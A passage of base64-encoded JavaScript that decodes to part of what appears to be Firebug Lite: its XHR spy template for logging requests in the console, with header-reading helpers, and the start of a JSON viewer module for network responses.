sZi4NCiAgICB2YXIgbmV0UHJvZ3Jlc3MgPSBzcHkuY29udGV4dC5uZXRQcm9ncmVzczsNCiAgICBpZiAobmV0UHJvZ3Jlc3MpDQogICAgICAgIG5ldFByb2dyZXNzLnBvc3QobmV0UHJvZ3Jlc3MuYWJvcnRGaWxlLCBbc3B5LnJlcXVlc3QsIHNweS5lbmRUaW1lLCBzcHkucG9zdFRleHQsIHNweS5yZXNwb25zZVRleHRdKTsNCn0NCi8qKi8NCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCi8qKg0KICogQGRvbXBsYXRlIFJlcHJlc2VudHMgYSB0ZW1wbGF0ZSBmb3IgWEhScyBsb2dnZWQgaW4gdGhlIENvbnNvbGUgcGFuZWwuIFRoZSBib2R5IG9mIHRoZQ0KICogbG9nIChkaXNwbGF5ZWQgd2hlbiBleHBhbmRlZCkgaXMgcmVuZGVyZWQgdXNpbmcge0BsaW5rIEZpcmVidWcuTmV0TW9uaXRvci5OZXRJbmZvQm9keX0uDQogKi8NCg0KRmlyZWJ1Zy5TcHkuWEhSID0gZG9tcGxhdGUoRmlyZWJ1Zy5SZXAsDQovKiogQGxlbmRzIEZpcmVidWcuU3B5LlhIUiAqLw0KDQp7DQogICAgdGFnOg0KICAgICAgICBESVYoeyJjbGFzcyI6ICJzcHlIZWFkIiwgX3JlcE9iamVjdDogIiRvYmplY3QifSwNCiAgICAgICAgICAgIFRBQkxFKHsiY2xhc3MiOiAic3B5SGVhZFRhYmxlIGZvY3VzUm93IG91dGVyRm9jdXNSb3ciLCBjZWxscGFkZGluZzogMCwgY2VsbHNwYWNpbmc6IDAsDQogICAgICAgICAgICAgICAgInJvbGUiOiAibGlzdGl0ZW0iLCAiYXJpYS1leHBhbmRlZCI6ICJmYWxzZSJ9LA0KICAgICAgICAgICAgICAgIFRCT0RZKHsicm9sZSI6ICJwcmVzZW50YXRpb24ifSwNCiAgICAgICAgICAgICAgICAgICAgVFIoeyJjbGFzcyI6ICJzcHlSb3cifSwNCiAgICAgICAgICAgICAgICAgICAgICAgIFREKHsiY2xhc3MiOiAic3B5VGl0bGVDb2wgc3B5Q29sIiwgb25jbGljazogIiRvblRvZ2dsZUJvZHkifSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBESVYoeyJjbGFzcyI6ICJzcHlUaXRsZSJ9LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiJG9iamVjdHxnZXRDYXB0aW9uIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRElWKHsiY2xhc3MiOiAic3B5RnVsbFRpdGxlIHNweVRpdGxlIn0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIkb2JqZWN0fGdldEZ1bGxVcmkiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgKSwNCiAgICAgICAgICAgICAgICAgICAgICAgIFREKHsiY2xhc3MiOiAic3B5Q29sIn0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRElWKHsiY2xhc3MiOiAic3B5U3RhdHVzIn0sICIkb2JqZWN0fGdldFN0YXR1cyIpDQogICAgICAgICAgICAgICAgICAgICAgICApLA0KICAgICAgICAgICAgICAgICAgICAgICAgVEQoeyJjbGFzcyI6ICJzcHlDb2wifSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTUEFOKHsiY2xhc3MiOiAic3B5SWNvbiJ9KQ0KICAgICAgICAgICAgICAgICAgICAgICAgKSwNCiAgICAgICAgICAgICAgICAgICAgICAgIFREKHsiY2xhc3MiOiAic3B5Q29sIn0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgU1BBTih7ImNsYXNzIjogInNweVRpbWUifSkNCiAgICAgICAgICAgICAgICAgICAgICAgICksDQogICAgICAgICAgICAgICAgICAgICAgICBURCh7ImNsYXNzIjogInNweUNvbCJ9LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRBRyhGaXJlYnVnUmVwcy5Tb3VyY2VMaW5rLnRhZywge29iamVjdDogIiRvYmplY3Quc291cmNlTGluayJ9KQ0KICAgICAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgKQ0KICAgICAgICApLA0KDQogICAgZ2V0Q2FwdGlvbjogZnVuY3Rpb24oc3B5KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIHNweS5tZXRob2QudG9VcHBlckNhc2UoKSArICIgIiArIGNyb3BTdHJpbmcoc3B5LmdldFVSTCgpLCAxMDApOw0KICAgIH0sDQoNCiAgICBnZXRGdWxsVXJpOiBmdW5jdGlvbihzcHkpDQogICAgew0KICAgICAgICByZXR1cm4gc3B5Lm1ldGhvZC50b1VwcGVyQ2FzZSgpICsgIiAiICsgc3B5LmdldFVSTCgpOw0KICAgIH0sDQoNCiAgICBnZXRTdGF0dXM6IGZ1bmN0aW9uKHNweSkNCiAgICB7DQogICAgICAgIHZhciB0ZXh0ID0gIiI7DQogICAgICAgIGlmIChzcHkuc3RhdHVzQ29kZSkNCiAgICAgICAgICAgIHRleHQgKz0gc3B5LnN0YXR1c0NvZGUgKyAiICI7DQoNCiAgICAgICAgaWYgKHNweS5zdGF0dXNUZXh0KQ0KICAgICAgICAgICAgcmV0dXJuIHRleHQgKz0gc3B5LnN0YXR1c1RleHQ7DQoNCiAgICAgICAgcmV0dXJuIHRleHQ7DQogICAgfSwNCg0KICAgIG9uVG9nZ2xlQm9keTogZnVuY3Rpb24oZXZlbnQpDQogICAgew0KICAgICAgICB2YXIgdGFyZ2V0ID0gZXZlbnQuY3VycmVudFRhcmdldCB8fCBldmVudC5zcmNFbGVtZW50Ow0KICAgICAgICB2YXIgbG9nUm93ID0gZ2V0QW5jZXN0b3JCeUNsYXNzKHRhcmdldCwgImxvZ1Jvdy1zcHkiKTsNCg0KICAgICAgICBpZiAoaXNMZWZ0Q2xpY2soZXZlbnQpKQ0KICAgICAgICB7DQogICAgICAgICAgICB0b2dnbGVDbGFzcyhsb2dSb3csICJvcGVuZWQiKTsNCg0KICAgICAgICAgICAgdmFyIHNweSA9IGdldENoaWxkQnlDbGFzcyhsb2dSb3csICJzcHlIZWFkIikucmVwT2JqZWN0Ow0KICAgICAgICAgICAgdmFyIHNweUhlYWRUYWJsZSA9IGdldEFuY2VzdG9yQnlDbGFzcyh0YXJnZXQsICJzcHlIZWFkVGFibGUiKTsNCg0KICAgICAgICAgICAgaWYgKGhhc0NsYXNzKGxvZ1JvdywgIm9wZW5lZCIpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHVwZGF0ZUh0dHBTcHlJbmZvKHNweSwgbG9nUm93KTsNCiAgICAgICAgICAgICAgICBpZiAoc3B5SGVhZFRhYmxlKQ0KICAgICAgICAgICAgICAgICAgICBzcHlIZWFkVGFibGUuc2V0QXR0cmlidXRlKCdhcmlhLWV4cGFuZGVkJywgJ3RydWUnKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvL3ZhciBuZXRJbmZvQm94ID0gZ2V0Q2hpbGRCeUNsYXNzKHNweS5sb2dSb3csICJzcHlIZWFkIiwgIm5ldEluZm9Cb2R5Iik7DQogICAgICAgICAgICAgICAgLy9kaXNwYXRjaChGaXJlYnVnLk5ldE1vbml0b3IuTmV0SW5mb0JvZHkuZmJMaXN0ZW5lcnMsICJkZXN0cm95VGFiQm9keSIsIFtuZXRJbmZvQm94LCBzcHldKTsNCiAgICAgICAgICAgICAgICAvL2lmIChzcHlIZWFkVGFibGUpDQogICAgICAgICAgICAgICAgLy8gICAgc3B5SGVhZFRhYmxlLnNldEF0dHJpYnV0ZSgnYXJpYS1leHBhbmRlZCcsICdmYWxzZScpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGNvcHlVUkw6IGZ1bmN0aW9uKHNweSkNCiAgICB7DQogICAgICAgIGNvcHlUb0NsaXBib2FyZChzcHkuZ2V0VVJMKCkpOw0KICAgIH0sDQoNCiAgICBjb3B5UGFyYW1zOiBmdW5jdGlvbihzcHkpDQogICAgew0KICAgICAgICB2YXIgdGV4dCA9IHNweS5wb3N0VGV4dDsNCiAgICAgICAgaWYgKCF0ZXh0KQ0KICAgICAgICAgICAgcmV0dXJuOw0KDQogICAgICAgIHZhciB1cmwgPSByZUVuY29kZVVSTChzcHksIHRleHQsIHRydWUpOw0KICAgICAgICBjb3B5VG9DbGlwYm9hcmQodXJsKTsNCiAgICB9LA0KDQogICAgY29weVJlc3BvbnNlOiBmdW5jdGlvbihzcHkpDQogICAgew0KICAgICAgICBjb3B5VG9DbGlwYm9hcmQoc3B5LnJlc3BvbnNlVGV4dCk7DQogICAgfSwNCg0KICAgIG9wZW5JblRhYjogZnVuY3Rpb24oc3B5KQ0KICAgIHsNCiAgICAgICAgb3Blbk5ld1RhYihzcHkuZ2V0VVJMKCksIHNweS5wb3N0VGV4dCk7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIHN1cHBvcnRzT2JqZWN0OiBmdW5jdGlvbihvYmplY3QpDQogICAgew0KICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBzcHkgeGhyDQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgDQogICAgICAgIHJldHVybiBvYmplY3QgaW5zdGFuY2VvZiBGaXJlYnVnLlNweS5YTUxIdHRwUmVxdWVzdFNweTsNCiAgICB9LA0KDQogICAgYnJvd3NlT2JqZWN0OiBmdW5jdGlvbihzcHksIGNvbnRleHQpDQogICAgew0KICAgICAgICB2YXIgdXJsID0gc3B5LmdldFVSTCgpOw0KICAgICAgICBvcGVuTmV3VGFiKHVybCk7DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0sDQoNCiAgICBnZXRSZWFsT2JqZWN0OiBmdW5jdGlvbihzcHksIGNvbnRleHQpDQogICAgew0KICAgICAgICByZXR1cm4gc3B5LnhoclJlcXVlc3Q7DQogICAgfSwNCg0KICAgIGdldENvbnRleHRNZW51SXRlbXM6IGZ1bmN0aW9uKHNweSkNCiAgICB7DQogICAgICAgIHZhciBpdGVtcyA9IFsNCiAgICAgICAgICAgIHtsYWJlbDogIkNvcHlMb2NhdGlvbiIsIGNvbW1hbmQ6IGJpbmRGaXhlZCh0aGlzLmNvcHlVUkwsIHRoaXMsIHNweSkgfQ0KICAgICAgICBdOw0KDQogICAgICAgIGlmIChzcHkucG9zdFRleHQpDQogICAgICAgIHsNCiAgICAgICAgICAgIGl0ZW1zLnB1c2goDQogICAgICAgICAgICAgICAge2xhYmVsOiAiQ29weUxvY2F0aW9uUGFyYW1ldGVycyIsIGNvbW1hbmQ6IGJpbmRGaXhlZCh0aGlzLmNvcHlQYXJhbXMsIHRoaXMsIHNweSkgfQ0KICAgICAgICAgICAgKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGl0ZW1zLnB1c2goDQogICAgICAgICAgICB7bGFiZWw6ICJDb3B5UmVzcG9uc2UiLCBjb21tYW5kOiBiaW5kRml4ZWQodGhpcy5jb3B5UmVzcG9uc2UsIHRoaXMsIHNweSkgfSwNCiAgICAgICAgICAgICItIiwNCiAgICAgICAgICAgIHtsYWJlbDogIk9wZW5JblRhYiIsIGNvbW1hbmQ6IGJpbmRGaXhlZCh0aGlzLm9wZW5JblRhYiwgdGhpcywgc3B5KSB9DQogICAgICAgICk7DQoNCiAgICAgICAgcmV0dXJuIGl0ZW1zOw0KICAgIH0NCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KZnVuY3Rpb24gdXBkYXRlVGltZShzcHkpDQp7DQogICAgdmFyIHRpbWVCb3ggPSBzcHkubG9nUm93LmdldEVsZW1lbnRzQnlDbGFzc05hbWUoInNweVRpbWUiKS5pdGVtKDApOw0KICAgIGlmIChzcHkucmVzcG9uc2VUaW1lKQ0KICAgICAgICB0aW1lQm94LnRleHRDb250ZW50ID0gIiAiICsgZm9ybWF0VGltZShzcHkucmVzcG9uc2VUaW1lKTsNCn0NCg0KZnVuY3Rpb24gdXBkYXRlTG9nUm93KHNweSkNCnsNCiAgICB1cGRhdGVUaW1lKHNweSk7DQoNCiAgICB2YXIgc3RhdHVzQm94ID0gc3B5LmxvZ1Jvdy5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKCJzcHlTdGF0dXMiKS5pdGVtKDApOw0KICAgIHN0YXR1c0JveC50ZXh0Q29udGVudCA9IEZpcmVidWcuU3B5LlhIUi5nZXRTdGF0dXMoc3B5KTsNCg0KICAgIHJlbW92ZUNsYXNzKHNweS5sb2dSb3csICJsb2FkaW5nIik7DQogICAgc2V0Q2xhc3Moc3B5LmxvZ1JvdywgImxvYWRlZCIpOw0KDQogICAgdHJ5DQogICAgew0KICAgICAgICB2YXIgZXJyb3JSYW5nZSA9IE1hdGguZmxvb3Ioc3B5LnhoclJlcXVlc3Quc3RhdHVzLzEwMCk7DQogICAgICAgIGlmIChlcnJvclJhbmdlID09IDQgfHwgZXJyb3JSYW5nZSA9PSA1KQ0KICAgICAgICAgICAgc2V0Q2xhc3Moc3B5LmxvZ1JvdywgImVycm9yIik7DQogICAgfQ0KICAgIGNhdGNoIChleGMpDQogICAgew0KICAgIH0NCn0NCg0KdmFyIHVwZGF0ZUh0dHBTcHlJbmZvID0gZnVuY3Rpb24gdXBkYXRlSHR0cFNweUluZm8oc3B5LCBsb2dSb3cpDQp7DQogICAgaWYgKCFzcHkubG9nUm93ICYmIGxvZ1JvdykNCiAgICAgICAgc3B5LmxvZ1JvdyA9IGxvZ1JvdzsNCiAgICANCiAgICBpZiAoIXNweS5sb2dSb3cgfHwgIWhhc0NsYXNzKHNweS5sb2dSb3csICJvcGVuZWQiKSkNCiAgICAgICAgcmV0dXJuOw0KDQogICAgaWYgKCFzcHkucGFyYW1zKQ0KICAgICAgICAvL3NweS5wYXJhbXMgPSBwYXJzZVVSTFBhcmFtcyhzcHkuaHJlZisiIik7DQogICAgICAgIHNweS5wYXJhbXMgPSBwYXJzZVVSTFBhcmFtcyhzcHkuaHJlZisiIik7DQoNCiAgICBpZiAoIXNweS5yZXF1ZXN0SGVhZGVycykNCiAgICAgICAgc3B5LnJlcXVlc3RIZWFkZXJzID0gZ2V0UmVxdWVzdEhlYWRlcnMoc3B5KTsNCg0KICAgIGlmICghc3B5LnJlc3BvbnNlSGVhZGVycyAmJiBzcHkubG9hZGVkKQ0KICAgICAgICBzcHkucmVzcG9uc2VIZWFkZXJzID0gZ2V0UmVzcG9uc2VIZWFkZXJzKHNweSk7DQoNCiAgICB2YXIgdGVtcGxhdGUgPSBGaXJlYnVnLk5ldE1vbml0b3IuTmV0SW5mb0JvZHk7DQogICAgdmFyIG5ldEluZm9Cb3ggPSBnZXRDaGlsZEJ5Q2xhc3Moc3B5LmxvZ1JvdywgInNweUhlYWQiLCAibmV0SW5mb0JvZHkiKTsNCiAgICBpZiAoIW5ldEluZm9Cb3gpDQogICAgew0KICAgICAgICB2YXIgaGVhZCA9IGdldENoaWxkQnlDbGFzcyhzcHkubG9nUm93LCAic3B5SGVhZCIpOw0KICAgICAgICBuZXRJbmZvQm94ID0gdGVtcGxhdGUudGFnLmFwcGVuZCh7ImZpbGUiOiBzcHl9LCBoZWFkKTsNCiAgICAgICAgZGlzcGF0Y2godGVtcGxhdGUuZmJMaXN0ZW5lcnMsICJpbml0VGFiQm9keSIsIFtuZXRJbmZvQm94LCBzcHldKTsNCiAgICAgICAgdGVtcGxhdGUuc2VsZWN0VGFiQnlOYW1lKG5ldEluZm9Cb3gsICJSZXNwb25zZSIpOw0KICAgIH0NCiAgICBlbHNlDQogICAgew0KICAgICAgICB0ZW1wbGF0ZS51cGRhdGVJbmZvKG5ldEluZm9Cb3gsIHNweSwgc3B5LmNvbnRleHQpOw0KICAgIH0NCn07DQoNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KZnVuY3Rpb24gZ2V0UmVxdWVzdEhlYWRlcnMoc3B5KQ0Kew0KICAgIHZhciBoZWFkZXJzID0gW107DQoNCiAgICB2YXIgY2hhbm5lbCA9IHNweS54aHJSZXF1ZXN0LmNoYW5uZWw7DQogICAgaWYgKGNoYW5uZWwgaW5zdGFuY2VvZiBDaS5uc0lIdHRwQ2hhbm5lbCkNCiAgICB7DQogICAgICAgIGNoYW5uZWwudmlzaXRSZXF1ZXN0SGVhZGVycyh7DQogICAgICAgICAgICB2aXNpdEhlYWRlcjogZnVuY3Rpb24obmFtZSwgdmFsdWUpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaGVhZGVycy5wdXNoKHtuYW1lOiBuYW1lLCB2YWx1ZTogdmFsdWV9KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSk7DQogICAgfQ0KDQogICAgcmV0dXJuIGhlYWRlcnM7DQp9DQoNCmZ1bmN0aW9uIGdldFJlc3BvbnNlSGVhZGVycyhzcHkpDQp7DQogICAgdmFyIGhlYWRlcnMgPSBbXTsNCg0KICAgIHRyeQ0KICAgIHsNCiAgICAgICAgdmFyIGNoYW5uZWwgPSBzcHkueGhyUmVxdWVzdC5jaGFubmVsOw0KICAgICAgICBpZiAoY2hhbm5lbCBpbnN0YW5jZW9mIENpLm5zSUh0dHBDaGFubmVsKQ0KICAgICAgICB7DQogICAgICAgICAgICBjaGFubmVsLnZpc2l0UmVzcG9uc2VIZWFkZXJzKHsNCiAgICAgICAgICAgICAgICB2aXNpdEhlYWRlcjogZnVuY3Rpb24obmFtZSwgdmFsdWUpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBoZWFkZXJzLnB1c2goe25hbWU6IG5hbWUsIHZhbHVlOiB2YWx1ZX0pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0pOw0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIChleGMpDQogICAgew0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfU1BZIHx8IEZCVHJhY2UuREJHX0VSUk9SUykNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJzcHkuZ2V0UmVzcG9uc2VIZWFkZXJzOyBFWENFUFRJT04gIiArDQogICAgICAgICAgICAgICAgc2FmZUdldFJlcXVlc3ROYW1lKHNweS5yZXF1ZXN0KSwgZXhjKTsNCiAgICB9DQoNCiAgICByZXR1cm4gaGVhZGVyczsNCn0NCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBSZWdpc3RyYXRpb24NCg0KRmlyZWJ1Zy5yZWdpc3Rlck1vZHVsZShGaXJlYnVnLlNweSk7DQovL0ZpcmVidWcucmVnaXN0ZXJSZXAoRmlyZWJ1Zy5TcHkuWEhSKTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQp9fSk7DQoNCg0KLyogU2VlIGxpY2Vuc2UudHh0IGZvciB0ZXJtcyBvZiB1c2FnZSAqLw0KDQpGQkwubnMoZnVuY3Rpb24oKSB7IHdpdGggKEZCTCkgew0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KLy8gTGlzdCBvZiBKU09OIGNvbnRlbnQgdHlwZXMuDQp2YXIgY29udGVudFR5cGVzID0NCnsNCiAgICAvLyBUT0RPOiBjcmVhdGUgaXNzdWU6IGpzb25WaWV3ZXIgd2lsbCBub3QgdHJ5IHRvIGV2YWx1YXRlIHRoZSBjb250ZW50cyBvZiB0aGUgcmVxdWVzdGVkIGZpbGUgDQogICAgLy8gaWYgdGhlIGNvbnRlbnQtdHlwZSBpcyBzZXQgdG8gInRleHQvcGxhaW4iDQogICAgLy8idGV4dC9wbGFpbiI6IDEsDQogICAgInRleHQvamF2YXNjcmlwdCI6IDEsDQogICAgInRleHQveC1qYXZhc2NyaXB0IjogMSwNCiAgICAidGV4dC9qc29uIjogMSwNCiAgICAidGV4dC94LWpzb24iOiAxLA0KICAgICJhcHBsaWNhdGlvbi9qc29uIjogMSwNCiAgICAiYXBwbGljYXRpb24veC1qc29uIjogMSwNCiAgICAiYXBwbGljYXRpb24vamF2YXNjcmlwdCI6IDEsDQogICAgImFwcGxpY2F0aW9uL3gtamF2YXNjcmlwdCI6IDEsDQogICAgImFwcGxpY2F0aW9uL2pzb24tcnBjIjogMQ0KfTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBNb2RlbCBpbXBsZW1lbnRhdGlvbg0KDQpGaXJlYnVnLkpTT05WaWV3ZXJNb2RlbCA9IGV4dGVuZChGaXJlYnVnLk1vZHVsZSwNCnsNCiAgICBkaXNwYXRjaE5hbWU6ICJqc29uVmlld2VyIiwNCiAgICBpbml0aWFsaXplOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBGaXJlYnVnLk5ldE1vbml0b3IuTmV0SW5mb0JvZHkuYWRkTGlzdGVuZXIodGhpcyk7DQoNCiAgICAgICAgLy8gVXNlZCBieSBGaXJlYnVnLkRPTVBhbmVsLkRpclRhYmxlIGRvbXBsYXRlLg0KICAgICAgICB0aGlzLnRvZ2dsZXMgPSB7fTsNCiAgICB9LA0KDQogICAgc2h1dGRvd246IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIEZpcmVidWcuTmV0TW9uaXRvci5OZXRJbmZvQm9keS5yZW1vdmVMaXN0ZW5lcih0aGlzKTsNCiAgICB9LA0KDQogICAgaW5pdFRhYkJvZHk6IGZ1bmN0aW9uKGluZm9Cb3gsIGZpbGUpDQogICAgew0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfSlNPTlZJRVdFUikNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJqc29udmlld2VyLmluaXRUYWJCb2R5IiwgaW5mb0JveCk7DQoNCiAgICAgICAgLy8gTGV0IGxpc3RlbmVycyB0byBwYXJzZSB0aGUgSlNPTi4NCiAgICAgICAgZGlzcGF0Y2godGhpcy5mYkxpc3RlbmVycywgIm9uUGFyc2VKU09OIiwgW2ZpbGVdKTsNCg0KICAgICAgICAvLyBUaGUgSlNPTiBpcyBzdGlsbCBubyB0aGVyZSwgdHJ5IHRvIHBhcnNlIG1vc3QgY29tbW9uIGNhc2VzLg0KICAgICAgICBpZiAoIWZpbGUuanNvbk9iamVjdCkNCiAgICAgICAgew0KICAgICAgICAgICAgLy8vaWYgKHRoaXMuaXNKU09OKHNhZmVHZXRDb250ZW50VHlwZShmaWxlLnJlcXVlc3QpLCBmaWxlLnJlc3BvbnNlVGV4dCkpDQogICAgICAgICAgICBpZiAodGhpcy5pc0pTT04oZmlsZS5taW1lVHlwZSwgZmlsZS5yZXNwb25zZVRleHQpKQ0KICAgICAgICAgICAgICAgIGZpbGUuanNvbk9iamVjdCA9IHRoaXMucGFyc2VKU09OKGZpbGUpOw0KICAgICAgICB9DQoNCiAgICAgICAgLy8gVGhlIGpzb25PYmplY3QgaXMgY3JlYXRlZCBzbywgdGhlIEpTT04gdGFiIGNhbiBiZSBkaXNwbGF5ZWQuDQogICAgICAgIGlmIChmaWxlLmpzb25PYmplY3QgJiYgaGFzUHJvcGVydGllcyhmaWxlLmpzb25PYmplY3QpKQ0KICAgICAgICB7DQogICAgICAgICAgICBGaXJlYnVnLk5ldE1vbml0b3IuTmV0SW5mb0JvZHkuYXBwZW5kVGFiKGluZm9Cb3gsICJKU09OIiwNCiAgICAgICAgICAgICAgICAvLy8kU1RSKCJqc29udmlld2VyLnRhYi5KU09OIikpOw0KICAgICAgICAgICAgICAgICRTVFIoIkpTT04iKSk7DQoNCiAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19KU09OVklFV0VSKQ0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJqc29udmlld2VyLmluaXRUYWJCb2R5OyBKU09OIG9iamVjdCBhdmFpbGFibGUgIiArDQogICAgICAgICAgICAgICAgICAgICh0eXBlb2YoZmlsZS5qc29uT2JqZWN0KSAhPSAidW5kZWZpbmVkIiksIGZpbGUuanNvbk9iamVjdCk7DQogICAgICAgIH0NCiAgICB9LA0KDQogICAgaXNKU09OOiBmdW5jdGlvbihjb250ZW50VHlwZSwgZGF0YSkNCiAgICB7DQogICAgICAgIC8vIFdvcmthcm91bmQgZm9yIEpTT04gcmVzcG9uc2VzIHdpdGhvdXQgcHJvcGVyIGNvbnRlbnQgdHlwZQ0KICAgICAgICAvLyBMZXQncyBjb25zaWRlciBhbGwgcmVzcG9uc2VzIHN0YXJ0aW5nIHdpdGggInsiIGFzIEpTT04uIEluIHRoZSB3b3JzdA0KICAgICAgICAvLyBjYXNlIHRoZXJlIHdpbGwgYmUgYW4gZXhjZXB0aW9uIHdoZW4gcGFyc2luZy4gVGhpcyBtZWFucyB0aGF0IG5vLUpTT04NCiAgICAgICAgLy8gcmVzcG9uc2VzIChhbmQgcG9zdCBkYXRhKSAod2l0aCAieyIpIGNhbiBiZSBwYXJzZWQgdW5uZWNlc3NhcmlseSwNCiAgICAgICAgLy8gd2hpY2ggcmVwcmVzZW50cyBhIGxpdHRsZSBvdmVyaGVhZCwgYnV0IHRoaXMgaGFwcGVucyBvbmx5IGlmIHRoZSByZXF1ZXN0DQogICAgICAgIC8vIGlzIGFjdHVhbGx5IGV4cGFuZGVkIGJ5IHRoZSB1c2VyIGluIHRoZSBVSSAoTmV0ICYgQ29uc29sZSBwYW5lbHMpLg0KICAgICAgICANCiAgICAgICAgLy8vdmFyIHJlc3BvbnNlVGV4dCA9IGRhdGEgPyB0cmltTGVmdChkYXRhKSA6IG51bGw7DQogICAgICAgIC8vL2lmIChyZXNwb25zZVRleHQgJiYgcmVzcG9uc2VUZXh0LmluZGV4T2YoInsiKSA9PSAwKQ0KICAgICAgICAvLy8gICAgcmV0dXJuIHRydWU7DQogICAgICAgIHZhciByZXNwb25zZVRleHQgPSBkYXRhID8gdHJpbShkYXRhKSA6IG51bGw7DQogICAgICAgIGlmIChyZXNwb25zZVRleHQgJiYgcmVzcG9uc2VUZXh0LmluZGV4T2YoInsiKSA9PSAwKQ0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQoNCiAgICAgICAgaWYgKCFjb250ZW50VHlwZSkNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCg0KICAgICAgICBjb250ZW50VHlwZSA9IGNvbnRlbnRUeXBlLnNwbGl0KCI7IilbMF07DQogICAgICAgIGNvbnRlbnRUeXBlID0gdHJpbShjb250ZW50VHlwZSk7DQogICAgICAgIHJldHVybiBjb250ZW50VHlwZXNbY29udGVudFR5cGVdOw0KICAgIH0sDQoNCiAgICAvLyBVcGRhdGUgbGlzdGVuZXIgZm9yIFRhYlZpZXcNCiAgICB1cGRhdGVUYWJCb2R5OiBmdW5jdGlvbihpbmZvQm94LCBmaWxlLCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgdmFyIHRhYiA9IGluZm9Cb3guc2VsZWN0ZWRUYWI7DQogICAgICAgIC8vL3ZhciB0YWJCb2R5ID0gaW5mb0JveC5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKCJuZXRJbmZvSlNPTlRleHQiKS5pdGVtKDApOw0KICAgICAgICB2YXIgdGFiQm9keSA9ICQkKCIubmV0SW5mb0pTT05UZXh0IiwgaW5mb0JveClbMF07DQogICAgICAgIGlmICghaGFzQ2xhc3ModGFiLCAibmV0SW5mb0pTT05UYWIiKSB8fCB0YWJCb2R5LnVwZGF0ZWQpDQogICAgICAgICAgICByZXR1cm47DQoNCiAgICAgICAgdGFiQm9keS51cGRhdGVkID0gdHJ1ZTsNCg0KICAgICAgICBpZiAoZmlsZS5qc29uT2JqZWN0KSB7DQogICAgICAgICAgICBGaXJlYnVnLkRPTVBhbmVsLkRpclRhYmxlLnRhZy5yZXBsYWNlKA0KICAgICAgICAgICAgICAgICB7b2JqZWN0OiBmaWxlLmpzb25PYmplY3QsIHRvZ2dsZXM6IHRoaXMudG9nZ2xlc30sIHRhYkJvZHkpOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIHBhcnNlSlNPTjogZnVuY3Rpb24oZmlsZSkNCiAgICB7DQogICAgICAgIHZhciBqc29uU3RyaW5nID0gbmV3IFN0cmluZyhm